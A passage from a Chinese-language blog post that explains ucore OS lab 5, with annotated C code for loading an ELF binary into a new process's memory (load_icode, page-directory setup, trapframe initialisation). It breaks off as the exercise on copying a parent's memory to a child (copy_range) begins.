</span>&#123;</span><br><span class="line">    <span class="comment">// binary:&quot;已经加载到内存中的文件&quot;的头文件(ELF格式)</span></span><br><span class="line">    <span class="comment">// size:&quot;已经加载到内存中的文件&quot;的大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>) &#123; <span class="comment">/* 检查当前进程是否为NULL */</span></span><br><span class="line">        panic(<span class="string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span> <span class="comment">/* mm_struct结构体:用于描述虚拟内存区域(vma)的各种信息 */</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 创建一片虚拟内存 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_mm; <span class="comment">/* 创建失败,直接返回 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>) &#123; <span class="comment">/* 新建一个页目录表,每个进程都需要一个页目录表 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm; <span class="comment">/* 创建失败,执行mm_destroy */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> *<span class="title">elf</span> =</span> (struct elfhdr *)binary; <span class="comment">/* 获取的二进制文件的文件头 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span> =</span> (struct proghdr *)(binary + elf-&gt;e_phoff); <span class="comment">/* 获取二进制文件的程序头表入口 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123; <span class="comment">/* 检查该程序的魔数是否正确 */</span></span><br><span class="line">        ret = -E_INVAL_ELF;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &lt;---- 遍历程序头表,并构建vma ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph_end</span> =</span> ph + elf-&gt;e_phnum; </span><br><span class="line">    <span class="comment">/* ph_end:计算出程序头表的结尾地址 */</span></span><br><span class="line">    <span class="comment">/* elf-&gt;e_phnum:程序头表中的条目数 */</span></span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; ph_end; ph ++) &#123; <span class="comment">/* 遍历整个程序头表(ph就是各个段头表) */</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;</span><br><span class="line">            <span class="comment">/* 遍历寻找到ELF_PT_LOAD为止,在ucore中,该段是TEXT/DATA */</span></span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123; </span><br><span class="line">            <span class="comment">/* 文件中段的大小 &gt; 内存中段的大小 */</span></span><br><span class="line">            <span class="comment">/* 内存中p_memsz大于p_filesz的原因是,可加载段可能包含一个.bss部分,没有此部分则是等于状态,绝对不可能是小于状态 */</span></span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 根据标志位进行初始化,准备构建vma ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;</span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 调用mm_map,为目标段构建新的vma */</span></span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 建立并分配页目录表,复制TEXT/DATA段到进程的内存(建立映射) ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *from = binary + ph-&gt;p_offset; <span class="comment">/* 获取TEXT/DATA的段地址 */</span></span><br><span class="line">        <span class="keyword">size_t</span> off, size;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line">        <span class="comment">/* start:初始化为段起始地址(映射段的虚拟地址) */</span></span><br><span class="line">        <span class="comment">/* la(可变参数):start进行内存页对齐后(只舍不进)的地址 */</span></span><br><span class="line">        </span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_filesz; </span><br><span class="line">        <span class="comment">/* end:初始化为段结束地址(映射段的虚拟地址+文件中段的大小) */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123; <span class="comment">/* 持续为pgdir分配页表,直到整个段都完成映射 */</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">/* 分配一块物理页(作为页表),设置页表项(对应la),插入页表目录(pgdir) */</span></span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la; <span class="comment">/* 更新偏移 */</span></span><br><span class="line">            <span class="comment">/* 第一次: off=&#x27;start为了页对齐而舍弃的数值&#x27;(正) */</span></span><br><span class="line">            <span class="comment">/* 后续: off=&#x27;0&#x27; */</span></span><br><span class="line">            size = PGSIZE - off; <span class="comment">/* 更新已分配的段大小(每次增加PGSIZE) */</span></span><br><span class="line">            la += PGSIZE; <span class="comment">/* 更新当前的物理地址(每次增加PGSIZE) */</span>   </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123; </span><br><span class="line">                size -= la - end; <span class="comment">/* 获取准确的段大小 */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memcpy</span>(page2kva(page) + off, from, size);</span><br><span class="line">            <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,用memcpy在其中填入from(TEXT/DATA段的起始地址) */</span> </span><br><span class="line">            start += size; </span><br><span class="line">            from += size;</span><br><span class="line">            <span class="comment">/* 第一次: start增加的值比la小一些 */</span></span><br><span class="line">            <span class="comment">/* 后续: start和la都增加相同的值(PGSIZE),并且地址也相同 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 分配内存,建立并分配页目录表,建立BSS段(建立映射) ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_memsz; <span class="comment">/* end:初始化为段结束地址(映射段的虚拟地址+内存中段的大小) */</span></span><br><span class="line">        <span class="keyword">if</span> (start &lt; la) &#123; <span class="comment">/* start最后会小于等于la,以下代码就是为了当&quot;start&lt;la&quot;时,实现&quot;start=la&quot;,并且置空原start距新start多出的部分 */</span></span><br><span class="line">            <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, size = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size); </span><br><span class="line">            <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,并使用memset置空 */</span></span><br><span class="line">            start += size;</span><br><span class="line">            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123; <span class="comment">/* 持续为pgdir分配页表,直到整个段都完成映射 */</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,并使用memset置空 */</span></span><br><span class="line">            start += size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 构建用户堆栈内存 ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">    &#125;</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-2</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-3</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-4</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 设置当前进程的mm,sr3,设置CR3寄存器 ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    mm_count_inc(mm); <span class="comment">/* 设置并返回&quot;共享该虚拟内存空间mva的进程数&quot; */</span></span><br><span class="line">    current-&gt;mm = mm; <span class="comment">/* 设置当前进程的&quot;proc_struct-&gt;mm&quot;为该虚拟内存空间mva */</span></span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir); <span class="comment">/* 设置当前进程的&quot;proc_struct-&gt;cr3&quot;为该页目录表的地址 */</span></span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir)); <span class="comment">/* 设置CR3寄存器为当前页目录表的物理地址 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 为用户环境设置trapframe ----&gt; */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf; </span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe)); <span class="comment">/* 把trapframe清零 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- lab start ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* LAB5:EXERCISE1 YOUR CODE</span></span><br><span class="line"><span class="comment">     * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span></span><br><span class="line"><span class="comment">     * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span></span><br><span class="line"><span class="comment">     *          tf_cs should be USER_CS segment (see memlayout.h)</span></span><br><span class="line"><span class="comment">     *          tf_ds=tf_es=tf_ss should be USER_DS segment</span></span><br><span class="line"><span class="comment">     *          tf_esp should be the top addr of user stack (USTACKTOP)</span></span><br><span class="line"><span class="comment">     *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span></span><br><span class="line"><span class="comment">     *          tf_eflags should be set to enable computer to produce Interrupt</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- lab end ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out; <span class="comment">/* 直接返回 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他函数的代码：</p>
<ul>
<li>mm_create：创建一片虚拟内存，完成各个条目的初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;          <span class="comment">/* 按vma的起始地址排序的线性列表链接(vma链表) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span>   <span class="comment">/* 当前访问的vma，用于速度目的 */</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                    <span class="comment">/* 这些vma的PDT(页目录表) */</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                   <span class="comment">/* 这些vma的计数 */</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                   <span class="comment">/* 用于指向swap manager的某个链表 */</span></span><br><span class="line">    <span class="keyword">int</span> mm_count;                    <span class="comment">/* 共享mm的进程数 */</span></span><br><span class="line">    <span class="keyword">lock_t</span> mm_lock;                  <span class="comment">/* 关于锁的标记 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct mm_struct *</span></span><br><span class="line"><span class="function"><span class="title">mm_create</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct mm_struct)); <span class="comment">/* 申请物理内存 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        list_init(&amp;(mm-&gt;mmap_list)); <span class="comment">/* vma链表初始化 */</span></span><br><span class="line">        mm-&gt;mmap_cache = <span class="literal">NULL</span>;</span><br><span class="line">        mm-&gt;pgdir = <span class="literal">NULL</span>;</span><br><span class="line">        mm-&gt;map_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (swap_init_ok) swap_init_mm(mm); <span class="comment">/* 如果swap_manager程序初始化完毕,就对mm进行swap初始化 */</span></span><br><span class="line">        <span class="keyword">else</span> mm-&gt;sm_priv = <span class="literal">NULL</span>; <span class="comment">/* 否则禁用swap链表(可交换的已分配物理页链表) */</span></span><br><span class="line">        </span><br><span class="line">        set_mm_count(mm, <span class="number">0</span>); <span class="comment">/* 设置共享进程的数目为0 */</span></span><br><span class="line">        lock_init(&amp;(mm-&gt;mm_lock)); <span class="comment">/* 初始化锁 */</span></span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> mm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">list_init</span><span class="params">(<span class="keyword">list_entry_t</span> *elm)</span> </span>&#123;</span><br><span class="line">    elm-&gt;prev = elm-&gt;next = elm; <span class="comment">/* 把prev和next都设置为它自己 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">set_mm_count</span><span class="params">(struct mm_struct *mm, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    mm-&gt;mm_count = val; <span class="comment">/* 设置共享进程的数目为val */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">lock_init</span><span class="params">(<span class="keyword">lock_t</span> *lock)</span> </span>&#123;</span><br><span class="line">    *lock = <span class="number">0</span>; <span class="comment">/* 初始化锁 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mm_destroy：遍历并释放 vma 链表中的所有 vma，最后释放 mm</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">mm_destroy</span><span class="params">(struct mm_struct *mm)</span> </span>&#123;</span><br><span class="line">    assert(mm_count(mm) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;(mm-&gt;mmap_list), *le;</span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(<span class="built_in">list</span>)) != <span class="built_in">list</span>) &#123; <span class="comment">/* 遍历并释放vma链表中的所有vma */</span></span><br><span class="line">        list_del(le);</span><br><span class="line">        kfree(le2vma(le, list_link));  </span><br><span class="line">    &#125;</span><br><span class="line">    kfree(mm); </span><br><span class="line">    mm=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>setup_pgdir：申请一个页目录表</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGSHIFT         12      		 <span class="comment">// 1&lt;&lt;12=4096(一页的大小)</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">pages</span>;</span>			   			<span class="comment">// 页目录表首地址</span></span><br><span class="line"><span class="keyword">pde_t</span> *boot_pgdir = &amp;__boot_pgdir;		 <span class="comment">// 这里的boot_pgdir可能是所有pgdir的模板</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;                    <span class="comment">// 当前页被引用的次数,与内存共享有关</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;             <span class="comment">// 标志位的集合,与eflags寄存器类似</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;      <span class="comment">// 空闲的连续page数量,这个成员只会用在连续空闲page中的第一个page</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;     <span class="comment">// 两个分别指向上一个和下一个非连续空闲页的两个指针</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link; <span class="comment">// 用于连接上一个和下一个&quot;可交换已分配&quot;的物理页</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr;        <span class="comment">// 用于保存该物理页所对应的虚拟地址</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">setup_pgdir</span><span class="params">(struct mm_struct *mm)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((page = alloc_page()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 分配物理页,作为页目录表 */</span></span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir = page2kva(page); <span class="comment">/* 获取页目录表的虚拟地址 */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pgdir, boot_pgdir, PGSIZE); <span class="comment">/* 把boot_pgdir拷贝到pgdir(这里两边都是虚拟地址,C语言的&#x27;&amp;&#x27;符号用于获取虚拟地址) */</span></span><br><span class="line">    pgdir[PDX(VPT)] = PADDR(pgdir) | PTE_P | PTE_W; <span class="comment">/* PADDR转为物理地址后装入对应的页目录表项 */</span></span><br><span class="line">    mm-&gt;pgdir = pgdir; <span class="comment">/* 更新mm_struct结构体中的pgdir条目 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ppn_t</span></span></span><br><span class="line"><span class="function"><span class="title">page2ppn</span><span class="params">(struct Page *page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> page - pages; <span class="comment">/* 获取对应page管理的那一页的索引(物理地址偏移) */</span></span><br><span class="line">    <span class="comment">/* 其中pages可以认为是存储所有struct Page的首地址(页目录表) */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uintptr_t</span></span></span><br><span class="line"><span class="function"><span class="title">page2pa</span><span class="params">(struct Page *page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> page2ppn(page) &lt;&lt; PGSHIFT; <span class="comment">/* 得到&quot;page2ppn(page)&quot;的物理地址 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">page2kva</span><span class="params">(struct Page *page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> KADDR(page2pa(page)); <span class="comment">/* 返回物理地址&quot;page2pa(page)&quot;对应的虚拟地址 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mm_count_inc：设置并返回“共享该虚拟内存空间mva的进程数”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mm_count_inc</span><span class="params">(struct mm_struct *mm)</span> </span>&#123;</span><br><span class="line">    mm-&gt;mm_count += <span class="number">1</span>; <span class="comment">/* 共享该虚拟内存空间mva的进程数增加 */</span></span><br><span class="line">    <span class="keyword">return</span> mm-&gt;mm_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本实验的目的就是叫我们完善 load_icode 函数，代码很长很复杂，不过我都解析完了，可以参考上面的注释</p>
<p>其实 load_icode 函数就只有一个地方没有完成了：为用户环境设置 trapframe</p>
<p>下面是实现代码：（根据提示初始化几个数值就可以了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf; <span class="comment">/* 构建中断帧 */</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe)); <span class="comment">/* 初始化置空为&#x27;0&#x27; */</span></span><br><span class="line">    tf-&gt;tf_cs = USER_CS; </span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS; </span><br><span class="line">    tf-&gt;tf_esp = USTACKTOP;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="练习2-父进程复制自己的内存空间给子进程"><a href="#练习2-父进程复制自己的内存空间给子进程" class="headerlink" title="练习2-父进程复制自己的内存空间给子进程"></a>练习2-父进程复制自己的内存空间给子进程</h2><p>创建子进程的函数 do_fork 在执行中将拷贝当前进程（即父进程）的用户内存地址空间中的合法内容到新进程中（子进程），完成内存资源的复制，具体是通过 copy_range 函数实现的，请补充 copy_range 的实现，确保能够正确执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="comment">/* 将一个进程A的内存内容(start,end)复制到另一个进程B */</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> end, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    <span class="comment">// to:进程B(子进程)页面目录的地址</span></span><br><span class="line">    <span class="comment">// 